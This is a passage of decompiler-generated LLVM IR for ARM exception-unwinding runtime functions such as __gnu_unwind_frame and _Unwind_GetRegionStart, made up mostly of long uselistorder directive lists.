  uselistorder i32* @r7, { 420, 421, 422, 424, 425, 423, 426, 427, 428, 429, 0, 430, 431, 432, 444, 433, 434, 435, 436, 437, 438, 5, 439, 440, 441, 442, 443, 3, 1, 445, 65, 66, 67, 68, 104, 105, 106, 107, 108, 109, 446, 69, 6, 70, 71, 72, 7, 73, 74, 75, 76, 8, 77, 78, 9, 79, 80, 81, 10, 82, 83, 84, 85, 86, 11, 87, 88, 89, 90, 91, 12, 92, 93, 94, 95, 49, 50, 13, 51, 52, 53, 54, 55, 56, 14, 57, 58, 59, 60, 61, 62, 63, 64, 96, 100, 97, 98, 99, 101, 102, 103, 110, 111, 295, 296, 366, 367, 297, 298, 447, 448, 449, 450, 460, 461, 207, 208, 209, 210, 112, 113, 114, 115, 451, 452, 453, 454, 299, 300, 301, 302, 303, 304, 305, 306, 307, 116, 117, 15, 47, 48, 368, 369, 374, 375, 376, 377, 378, 379, 380, 370, 371, 372, 373, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 16, 395, 396, 397, 308, 309, 26, 281, 282, 283, 284, 310, 313, 314, 315, 311, 312, 253, 254, 255, 256, 316, 319, 320, 321, 317, 318, 162, 163, 118, 119, 322, 325, 326, 327, 323, 324, 234, 235, 120, 123, 124, 125, 121, 122, 170, 171, 172, 173, 174, 179, 180, 181, 182, 175, 176, 177, 178, 183, 184, 185, 186, 187, 188, 126, 127, 328, 329, 330, 331, 189, 190, 205, 206, 128, 17, 129, 130, 455, 18, 456, 457, 458, 459, 191, 192, 193, 194, 195, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 34, 43, 44, 35, 31, 19, 27, 28, 29, 30, 42, 32, 33, 36, 2, 37, 38, 39, 40, 41, 45, 46, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 164, 165, 166, 24, 167, 168, 169, 196, 197, 198, 199, 200, 201, 202, 203, 204, 213, 211, 212, 214, 215, 216, 217, 218, 20, 219, 21, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 231, 230, 232, 233, 25, 236, 239, 237, 238, 240, 241, 242, 243, 245, 244, 246, 247, 248, 250, 249, 251, 252, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 4, 275, 272, 273, 274, 276, 277, 278, 279, 280, 289, 285, 286, 287, 288, 290, 291, 292, 293, 294, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 22, 356, 357, 358, 359, 360, 361, 362, 363, 23, 364, 365, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419 }
  uselistorder i32* @lr, { 5, 0, 207, 208, 209, 210, 218, 211, 212, 213, 214, 3, 215, 216, 217, 219, 220, 221, 222, 223, 224, 226, 227, 7, 8, 228, 229, 230, 231, 232, 233, 234, 235, 236, 11, 12, 13, 14, 15, 16, 17, 18, 19, 9, 10, 20, 237, 238, 239, 240, 241, 246, 55, 56, 21, 22, 244, 245, 126, 127, 128, 129, 130, 242, 243, 173, 174, 175, 176, 177, 178, 179, 180, 181, 194, 195, 182, 183, 184, 185, 186, 187, 188, 4, 189, 190, 192, 193, 191, 116, 117, 131, 132, 94, 95, 133, 134, 196, 197, 45, 46, 47, 48, 49, 50, 135, 136, 225, 137, 198, 138, 23, 24, 6, 25, 26, 27, 1, 31, 32, 33, 34, 35, 36, 28, 29, 30, 37, 38, 39, 40, 41, 42, 43, 44, 51, 52, 53, 54, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 96, 97, 98, 103, 99, 100, 101, 102, 104, 105, 106, 2, 107, 108, 109, 110, 111, 112, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 199, 200, 201, 202, 203, 204, 205, 206 }
  uselistorder i32* @r6, { 496, 497, 498, 509, 499, 26, 500, 2, 501, 502, 3, 503, 504, 505, 506, 507, 508, 510, 0, 511, 512, 59, 60, 57, 58, 61, 513, 514, 4, 515, 516, 517, 518, 44, 45, 62, 5, 63, 64, 65, 66, 67, 21, 68, 69, 70, 6, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 42, 43, 46, 47, 48, 49, 7, 50, 51, 52, 8, 53, 54, 55, 56, 83, 27, 84, 22, 9, 10, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 325, 326, 327, 328, 521, 329, 11, 330, 331, 39, 12, 40, 13, 41, 519, 520, 426, 430, 431, 432, 433, 427, 428, 429, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 470, 471, 472, 446, 447, 448, 449, 450, 14, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 466, 468, 462, 463, 464, 465, 467, 469, 96, 97, 1, 98, 304, 305, 332, 333, 334, 335, 336, 276, 277, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 99, 100, 101, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 347, 348, 349, 350, 102, 103, 104, 105, 191, 15, 192, 193, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 33, 34, 35, 36, 31, 38, 37, 28, 29, 30, 32, 142, 143, 144, 145, 146, 147, 154, 155, 156, 157, 158, 148, 149, 150, 151, 152, 153, 306, 307, 308, 309, 159, 160, 161, 162, 163, 164, 165, 169, 166, 167, 168, 170, 16, 171, 172, 173, 174, 175, 176, 194, 195, 196, 197, 23, 198, 199, 200, 17, 201, 202, 203, 209, 204, 205, 206, 207, 208, 210, 211, 212, 213, 214, 215, 220, 216, 217, 218, 219, 221, 222, 223, 224, 225, 226, 232, 227, 228, 229, 230, 231, 233, 234, 235, 236, 237, 238, 239, 244, 240, 241, 242, 243, 245, 246, 247, 248, 249, 250, 251, 252, 257, 253, 254, 255, 256, 258, 259, 260, 261, 262, 263, 264, 265, 266, 271, 267, 268, 269, 270, 272, 273, 274, 275, 285, 278, 279, 280, 281, 282, 283, 284, 286, 287, 288, 289, 290, 291, 297, 292, 293, 294, 295, 296, 298, 299, 300, 301, 302, 303, 310, 311, 312, 318, 313, 314, 315, 316, 317, 319, 320, 321, 322, 323, 324, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 25, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 24, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 18, 19, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 20, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495 }
  uselistorder label %dec_label_pc_1b268, { 1, 0 }
  uselistorder label %dec_label_pc_1b204, { 1, 0 }
  uselistorder label %dec_label_pc_1b1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1b188, { 1, 0 }
  uselistorder label %dec_label_pc_1b0f4, { 1, 0 }
  uselistorder label %dec_label_pc_1b0d8, { 1, 0 }
  uselistorder label %dec_label_pc_1b0bc, { 1, 0 }
  uselistorder label %dec_label_pc_1b06c, { 1, 0 }
  uselistorder label %dec_label_pc_1b050, { 1, 0 }
  uselistorder label %dec_label_pc_1afcc, { 1, 0 }
  uselistorder label %dec_label_pc_1afb0, { 1, 0 }
  uselistorder label %dec_label_pc_1aeec, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_1aebc, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_1aea4, { 1, 0 }
  uselistorder label %dec_label_pc_1ae88, { 1, 0 }
  uselistorder label %dec_label_pc_1abec.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1ad14, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1ad08, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1acfc, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1acac, { 1, 0 }
  uselistorder label %dec_label_pc_1ac9c, { 1, 0 }
  uselistorder label %dec_label_pc_1ac28, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1b2f0 = add i32 %ucbp, 76
  %v2_1b2f0 = inttoptr i32 %v1_1b2f0 to i32*
  %v3_1b2f0 = load i32, i32* %v2_1b2f0, align 4
  %v1_1b2f4 = add i32 %v3_1b2f0, 4
  %v2_1b2f4 = inttoptr i32 %v1_1b2f4 to i32*
  %v3_1b2f4 = load i32, i32* %v2_1b2f4, align 4
  %v3_1b2fc = mul i32 %v3_1b2f4, 256
  %v4_1b304 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_1b2fc, i32* %v4_1b304, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_1b324 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_1b324

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 278, 269, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 261, 270, 267, 47, 268, 48, 50, 49, 51, 260, 0, 265, 1, 52, 53, 54, 55, 56, 58, 59, 60, 57, 62, 63, 64, 61, 65, 66, 271, 272, 67, 68, 69, 273, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 80, 79, 82, 263, 274, 264, 83, 84, 85, 86, 87, 89, 88, 90, 92, 91, 93, 275, 94, 95, 276, 106, 100, 96, 107, 101, 108, 102, 97, 98, 103, 104, 109, 105, 99, 110, 111, 112, 113, 114, 115, 116, 123, 120, 117, 124, 121, 125, 122, 118, 119, 126, 127, 128, 129, 140, 135, 141, 136, 142, 137, 143, 138, 130, 131, 132, 133, 144, 139, 134, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 161, 158, 162, 159, 163, 160, 155, 156, 157, 164, 165, 166, 167, 168, 178, 179, 173, 169, 180, 174, 181, 175, 170, 176, 182, 177, 171, 172, 183, 184, 185, 186, 187, 188, 193, 191, 189, 194, 192, 190, 195, 262, 277, 196, 198, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 216, 223, 217, 224, 218, 219, 212, 213, 225, 220, 226, 221, 214, 215, 222, 227, 228, 229, 230, 231, 232, 237, 244, 238, 245, 239, 233, 234, 246, 240, 247, 241, 242, 235, 236, 243, 248, 249, 250, 251, 252, 253, 254, 255, 256, 266, 257, 258, 259 }
  uselistorder i32 4, { 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 116, 551, 552, 553, 554, 555, 3, 558, 559, 556, 557, 560, 4, 561, 562, 563, 564, 5, 581, 6, 565, 566, 567, 568, 569, 7, 570, 8, 571, 572, 573, 574, 575, 576, 577, 9, 578, 169, 579, 580, 582, 583, 584, 585, 10, 586, 11, 277, 278, 279, 280, 296, 297, 587, 258, 259, 538, 264, 281, 12, 13, 590, 14, 15, 103, 98, 99, 16, 591, 100, 592, 74, 17, 18, 101, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 19, 610, 611, 612, 613, 614, 615, 73, 616, 617, 618, 619, 620, 621, 20, 21, 102, 622, 289, 117, 287, 288, 282, 283, 284, 285, 286, 260, 261, 262, 263, 265, 266, 267, 268, 269, 270, 22, 271, 118, 272, 273, 274, 275, 276, 170, 290, 291, 292, 293, 294, 295, 23, 298, 299, 300, 301, 352, 353, 302, 303, 304, 623, 24, 171, 119, 172, 625, 25, 626, 173, 256, 257, 624, 90, 459, 460, 461, 462, 174, 75, 465, 466, 467, 468, 469, 470, 175, 176, 26, 471, 472, 473, 474, 475, 476, 477, 478, 177, 463, 464, 479, 480, 481, 482, 483, 484, 485, 486, 487, 27, 488, 489, 490, 491, 28, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 178, 179, 180, 506, 507, 510, 513, 508, 509, 120, 181, 511, 67, 512, 514, 515, 516, 518, 182, 30, 29, 517, 183, 184, 185, 305, 186, 68, 31, 32, 354, 355, 356, 357, 358, 33, 359, 76, 434, 435, 226, 34, 35, 588, 589, 227, 36, 37, 121, 306, 77, 247, 122, 248, 38, 124, 249, 125, 250, 126, 251, 308, 309, 39, 310, 85, 86, 84, 311, 228, 229, 252, 253, 123, 234, 235, 236, 230, 231, 232, 233, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 254, 255, 70, 69, 312, 91, 313, 40, 314, 72, 71, 315, 41, 307, 316, 317, 322, 127, 323, 128, 324, 129, 325, 130, 326, 131, 327, 132, 328, 133, 329, 134, 330, 135, 331, 136, 332, 137, 333, 138, 334, 139, 335, 140, 336, 141, 337, 142, 338, 143, 340, 144, 341, 145, 342, 343, 339, 318, 146, 319, 320, 321, 344, 89, 88, 87, 345, 147, 42, 43, 44, 45, 46, 47, 346, 79, 78, 347, 80, 148, 348, 349, 350, 149, 351, 360, 187, 361, 362, 363, 364, 365, 188, 189, 150, 366, 48, 151, 367, 104, 368, 369, 190, 370, 371, 191, 192, 372, 152, 373, 105, 374, 375, 193, 194, 376, 195, 377, 378, 379, 196, 197, 380, 153, 381, 106, 382, 198, 199, 383, 384, 385, 154, 107, 386, 387, 200, 388, 389, 390, 201, 202, 0, 155, 391, 108, 392, 393, 394, 203, 395, 396, 204, 205, 1, 92, 397, 156, 398, 109, 399, 400, 401, 402, 206, 207, 403, 404, 208, 405, 406, 157, 407, 2, 408, 110, 409, 158, 410, 411, 412, 209, 413, 414, 415, 416, 210, 211, 160, 417, 93, 418, 159, 419, 111, 420, 421, 422, 212, 423, 424, 425, 161, 426, 162, 427, 428, 429, 213, 214, 163, 430, 94, 431, 112, 432, 113, 433, 436, 437, 114, 438, 95, 439, 440, 441, 442, 115, 443, 164, 444, 445, 446, 96, 447, 165, 448, 49, 50, 51, 52, 53, 449, 450, 451, 54, 83, 82, 81, 452, 55, 56, 166, 453, 167, 454, 455, 456, 168, 457, 458, 215, 57, 519, 216, 58, 520, 217, 59, 521, 218, 60, 522, 219, 97, 61, 523, 524, 220, 62, 525, 221, 63, 526, 222, 64, 527, 223, 65, 528, 224, 66, 529, 530, 225, 531, 532, 533, 534, 535, 536, 537, 539, 540 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 725, 1324, 1325, 540, 1329, 1330, 1331, 1332, 579, 1333, 1334, 502, 520, 580, 1326, 1327, 1328, 1335, 541, 1336, 726, 120, 125, 123, 121, 126, 122, 124, 727, 728, 729, 730, 581, 582, 1337, 1338, 490, 733, 732, 731, 179, 181, 180, 182, 184, 183, 736, 735, 734, 185, 583, 584, 178, 1339, 175, 1340, 739, 738, 737, 141, 1341, 1342, 1343, 1344, 741, 740, 134, 136, 137, 135, 138, 131, 132, 495, 742, 374, 999, 743, 375, 376, 377, 744, 157, 1000, 1001, 1002, 152, 151, 153, 154, 745, 142, 746, 23, 20, 21, 19, 22, 747, 548, 972, 116, 117, 115, 110, 109, 1345, 521, 585, 1346, 1, 0, 748, 94, 89, 87, 88, 95, 92, 93, 90, 91, 86, 586, 67, 749, 379, 380, 378, 503, 539, 504, 1318, 1319, 1320, 1321, 522, 750, 381, 752, 751, 382, 383, 978, 753, 1003, 1004, 1005, 1348, 1007, 1006, 491, 754, 508, 1008, 509, 1349, 974, 973, 1350, 510, 1351, 1352, 1353, 1354, 1355, 1356, 934, 1357, 1358, 1359, 1360, 1361, 1362, 935, 718, 756, 755, 460, 464, 466, 462, 461, 463, 465, 467, 469, 468, 1012, 1009, 1010, 1011, 536, 511, 44, 45, 47, 46, 587, 1013, 1014, 1029, 1030, 757, 719, 42, 43, 1021, 936, 1022, 1023, 937, 1024, 1025, 1026, 1027, 1028, 39, 33, 34, 36, 40, 37, 35, 38, 32, 41, 1015, 1016, 1017, 588, 1018, 1019, 1020, 758, 472, 476, 473, 470, 477, 471, 475, 474, 478, 1031, 1032, 1033, 759, 198, 197, 194, 193, 192, 199, 195, 196, 200, 1034, 1035, 1036, 1037, 760, 187, 188, 186, 190, 189, 191, 761, 163, 976, 589, 975, 537, 764, 763, 762, 386, 392, 384, 388, 387, 391, 389, 390, 393, 385, 590, 977, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 512, 765, 396, 394, 395, 399, 397, 398, 400, 990, 991, 992, 993, 994, 995, 996, 997, 998, 766, 24, 28, 30, 27, 25, 29, 26, 31, 591, 989, 767, 177, 1038, 1039, 1040, 1041, 1042, 592, 768, 48, 49, 51, 50, 52, 593, 53, 769, 212, 211, 208, 209, 210, 206, 207, 770, 213, 214, 221, 222, 217, 218, 219, 220, 215, 216, 771, 352, 350, 351, 772, 401, 773, 170, 169, 774, 159, 158, 775, 156, 155, 776, 1099, 145, 148, 146, 147, 402, 143, 144, 777, 140, 139, 778, 66, 779, 780, 310, 311, 1363, 1364, 1365, 594, 1366, 1367, 595, 1368, 783, 782, 781, 223, 225, 231, 224, 229, 228, 232, 230, 226, 227, 784, 108, 596, 785, 403, 404, 405, 786, 412, 410, 411, 409, 406, 407, 408, 787, 166, 167, 165, 168, 164, 788, 789, 160, 791, 790, 60, 792, 127, 1182, 795, 794, 793, 106, 107, 796, 96, 98, 97, 99, 513, 797, 100, 486, 492, 1258, 798, 57, 54, 55, 56, 58, 59, 1259, 1260, 1261, 799, 414, 413, 421, 420, 415, 422, 417, 418, 416, 423, 419, 85, 496, 969, 970, 971, 800, 801, 1369, 523, 597, 803, 802, 804, 65, 1262, 1265, 1266, 1267, 805, 424, 429, 430, 428, 427, 431, 425, 426, 1268, 1269, 1270, 1271, 806, 435, 441, 434, 440, 439, 433, 443, 442, 437, 432, 436, 438, 1263, 1264, 598, 248, 250, 249, 1272, 599, 1273, 1274, 1275, 1276, 1277, 807, 62, 63, 61, 64, 1278, 114, 113, 1279, 1280, 1281, 1282, 1283, 1284, 549, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 601, 1293, 1294, 1295, 1296, 1297, 600, 1298, 1299, 1300, 1301, 1302, 808, 446, 448, 444, 447, 451, 453, 450, 452, 454, 449, 455, 445, 304, 303, 602, 603, 500, 812, 811, 810, 809, 176, 309, 514, 173, 813, 150, 149, 814, 82, 81, 815, 133, 816, 456, 817, 818, 457, 819, 174, 820, 458, 821, 822, 459, 823, 119, 118, 824, 102, 101, 825, 84, 83, 826, 827, 481, 828, 282, 281, 829, 482, 830, 1172, 1173, 171, 172, 939, 940, 941, 942, 943, 944, 945, 1370, 298, 299, 300, 301, 831, 1100, 604, 161, 162, 1043, 832, 267, 266, 605, 1101, 833, 111, 112, 606, 834, 130, 128, 129, 1102, 835, 308, 307, 306, 836, 837, 104, 103, 838, 105, 839, 479, 840, 71, 70, 841, 256, 255, 842, 268, 844, 843, 284, 285, 846, 845, 201, 202, 283, 1183, 487, 1184, 488, 1347, 204, 203, 1185, 1186, 1187, 1188, 494, 1189, 848, 847, 17, 16, 11, 14, 12, 13, 10, 18, 15, 489, 505, 1190, 1191, 1192, 1193, 69, 68, 2, 1194, 1195, 1196, 1197, 1198, 515, 1199, 516, 1200, 850, 849, 480, 1103, 1104, 1105, 1106, 851, 1313, 1314, 1315, 506, 524, 3, 493, 4, 1316, 1201, 1202, 1203, 607, 1204, 205, 1303, 305, 1206, 1205, 1207, 1208, 1044, 361, 1209, 852, 254, 253, 252, 251, 1210, 853, 296, 295, 294, 293, 608, 964, 609, 965, 552, 966, 525, 620, 967, 1045, 551, 1046, 951, 526, 621, 622, 952, 947, 611, 946, 948, 949, 950, 614, 612, 501, 953, 613, 954, 955, 615, 956, 957, 618, 958, 959, 616, 960, 961, 617, 962, 963, 619, 968, 1047, 1048, 1049, 623, 1050, 1051, 1052, 624, 1053, 938, 1056, 1055, 610, 1054, 1057, 1058, 625, 1059, 1060, 1061, 626, 1062, 627, 1063, 628, 1064, 629, 1065, 630, 1066, 631, 1067, 632, 1068, 633, 1069, 634, 1070, 635, 1071, 636, 1072, 637, 1073, 638, 1074, 639, 1075, 640, 1076, 641, 1077, 642, 1078, 643, 1079, 644, 1080, 1087, 1088, 497, 645, 720, 864, 863, 862, 861, 860, 859, 858, 721, 857, 856, 855, 854, 290, 287, 288, 289, 286, 291, 292, 1081, 1082, 646, 1083, 1084, 647, 1085, 1086, 76, 75, 74, 80, 77, 78, 79, 73, 72, 648, 649, 866, 865, 484, 485, 1174, 868, 867, 366, 367, 365, 364, 363, 362, 368, 652, 553, 1089, 1090, 554, 1091, 1092, 650, 651, 653, 1093, 1094, 654, 655, 656, 657, 658, 659, 660, 881, 880, 879, 878, 877, 876, 875, 874, 873, 872, 724, 871, 870, 869, 371, 373, 372, 661, 498, 662, 882, 665, 664, 663, 1095, 884, 883, 666, 667, 668, 1096, 1097, 669, 538, 670, 1098, 499, 671, 888, 887, 886, 885, 370, 369, 1107, 1113, 6, 527, 1108, 672, 1109, 5, 1110, 542, 1111, 528, 529, 1112, 1114, 1115, 543, 1116, 722, 892, 891, 723, 890, 889, 297, 1175, 555, 556, 1176, 7, 8, 9, 1117, 1118, 1119, 507, 544, 545, 1120, 1121, 1122, 1123, 1124, 674, 1125, 673, 1126, 675, 1127, 1128, 1129, 896, 895, 894, 893, 354, 357, 358, 360, 359, 353, 356, 355, 1130, 1131, 1132, 676, 677, 898, 897, 322, 324, 325, 321, 323, 1133, 1134, 678, 1135, 1136, 1137, 1138, 679, 1139, 680, 558, 557, 681, 1140, 899, 277, 278, 280, 279, 275, 276, 1141, 682, 1142, 561, 559, 560, 901, 900, 345, 346, 1143, 1144, 1145, 683, 1146, 684, 685, 1147, 562, 1148, 902, 234, 237, 238, 240, 239, 233, 236, 235, 1149, 1150, 1151, 686, 1152, 687, 564, 563, 688, 1153, 689, 1154, 903, 314, 317, 318, 320, 319, 312, 316, 315, 313, 1155, 1156, 1157, 1158, 1159, 1160, 690, 1161, 691, 1162, 692, 569, 568, 693, 1163, 565, 1164, 566, 1165, 567, 1166, 909, 908, 907, 906, 905, 904, 241, 244, 245, 247, 246, 242, 243, 1167, 1168, 1169, 694, 572, 571, 695, 1170, 570, 1171, 910, 328, 332, 333, 334, 327, 331, 330, 329, 1177, 1178, 1179, 696, 575, 574, 697, 1180, 573, 1181, 915, 914, 913, 912, 911, 258, 262, 263, 265, 264, 257, 261, 260, 259, 1211, 703, 1212, 1213, 701, 1214, 702, 1215, 1216, 706, 1217, 1218, 547, 704, 1219, 705, 1220, 1221, 577, 1222, 1223, 532, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 518, 1231, 707, 1232, 708, 709, 1233, 1234, 1235, 1236, 533, 1237, 1238, 534, 1239, 1240, 535, 1241, 519, 531, 530, 1242, 1243, 700, 1244, 1245, 698, 1246, 517, 699, 576, 1247, 1249, 1250, 1248, 710, 1251, 711, 1252, 712, 1253, 1254, 933, 550, 1255, 1256, 546, 713, 1257, 927, 926, 925, 924, 923, 922, 921, 920, 919, 918, 917, 916, 335, 337, 339, 340, 341, 344, 338, 336, 342, 343, 1304, 578, 714, 928, 347, 348, 349, 1305, 1306, 715, 1309, 716, 717, 1310, 1307, 1308, 1311, 1312, 272, 270, 273, 269, 271, 1317, 929, 274, 1322, 930, 326, 1323, 302, 931, 932, 483 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1b350 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1b358 = add i32 %tmp1, 72
  %v2_1b358 = inttoptr i32 %v1_1b358 to i32*
  %v3_1b358 = load i32, i32* %v2_1b358, align 4
  ret i32 %v3_1b358

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 170, 171, 172, 173, 14, 15, 59, 16, 174, 51, 11, 175, 176, 177, 178, 179, 181, 182, 180, 183, 184, 185, 186, 187, 188, 189, 17, 18, 19, 20, 22, 21, 23, 52, 53, 24, 25, 54, 55, 56, 57, 58, 60, 61, 83, 62, 63, 190, 5, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 3, 141, 142, 143, 144, 145, 26, 146, 147, 27, 28, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 166, 159, 160, 161, 162, 163, 164, 165, 167, 168, 29, 169, 4, 84, 85, 30, 86, 87, 88, 31, 64, 65, 47, 48, 37, 66, 67, 39, 49, 40, 41, 36, 38, 42, 43, 44, 45, 46, 50, 68, 69, 70, 6, 71, 72, 73, 74, 76, 77, 78, 32, 79, 33, 80, 82, 81, 75, 111, 89, 34, 90, 91, 92, 93, 94, 95, 96, 97, 35, 98, 99, 100, 12, 101, 102, 103, 104, 105, 106, 13, 107, 108, 109, 110, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 121, 123, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1b36c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1b36c)
  %v31_1b374 = load i32, i32* @r0, align 4
  ret i32 %v31_1b374

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 299, 300, 301, 16, 43, 80, 91, 302, 305, 306, 71, 17, 303, 304, 297, 46, 8, 307, 9, 18, 81, 0, 82, 10, 11, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 1, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 83, 42, 72, 73, 74, 75, 76, 77, 78, 79, 84, 85, 86, 87, 88, 89, 90, 19, 216, 20, 217, 21, 22, 23, 24, 178, 179, 334, 335, 337, 56, 57, 58, 59, 25, 196, 197, 2, 26, 27, 93, 94, 3, 28, 29, 338, 339, 4, 30, 31, 218, 219, 5, 32, 33, 69, 70, 336, 92, 277, 34, 52, 53, 278, 6, 279, 280, 281, 282, 54, 283, 284, 285, 55, 286, 287, 35, 295, 288, 289, 290, 291, 292, 293, 294, 95, 96, 36, 210, 37, 211, 220, 38, 221, 204, 39, 205, 222, 40, 223, 224, 41, 225, 97, 48, 98, 99, 49, 44, 180, 181, 182, 183, 226, 45, 227, 47, 228, 229, 230, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 62, 163, 60, 61, 63, 164, 166, 167, 168, 169, 170, 171, 165, 51, 12, 172, 173, 174, 175, 176, 177, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 212, 213, 7, 198, 199, 200, 201, 202, 203, 206, 207, 208, 209, 214, 215, 64, 65, 66, 231, 67, 232, 68, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 296, 298, 50 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 75, 76, 77, 85, 86, 87, 0, 47, 48, 49, 50, 51, 52, 53, 57, 58, 54, 55, 56, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
